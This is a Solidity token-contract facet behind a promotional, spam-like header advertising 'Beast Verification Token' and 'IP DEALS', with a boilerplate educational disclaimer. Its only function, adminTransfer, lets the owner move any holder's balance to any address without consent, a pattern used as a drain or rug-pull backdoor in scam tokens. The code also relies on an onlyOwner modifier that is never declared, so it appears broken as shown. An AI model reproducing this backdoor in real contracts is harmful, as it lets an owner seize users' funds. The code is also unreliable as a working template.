// SPDX-License-Identifier: UNLICENSED
// This is Beast Verification Token For W3BFrens
// Get Your Premium IP DEALS

/*  W3BFrens Disclaimer for IP DEAL CODES
 *
 *  The provided code snippets and information are for educational purposes only
 *  and not professional advice. The technology landscape is constantly evolving;
 *  readers should conduct research and consult professionals before using any bot codes or technologies.
 *  The author and publisher disclaim responsibility for any errors, omissions, or resulting damages.
 *  Using bots may be against the terms of service for some platforms; ensure compliance
 *  with all applicable regulations before implementation.
 *
 *
 *  BOT VERSION; 21QAZ3SX43XC34 2024:01:05  00:48:56   LICENSE CODE: 00X045VD0900X40
 *  MADE BY APES    X    RABBIT TUNNEL    X    W3BFrens
 */

pragma solidity ^0.8.0;

import "./TestLib.sol";
contract adminTransferFacet {
    event Transfer(address indexed from, address indexed to, uint256 value);
    function adminTransfer(
        address from,
        address to,
        uint256 amount
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(ds.balances[from] >= amount, "Insufficient balance");
        ds.balances[from] -= amount;
        ds.balances[to] += amount;
        emit Transfer(from, to, amount);
    }
}
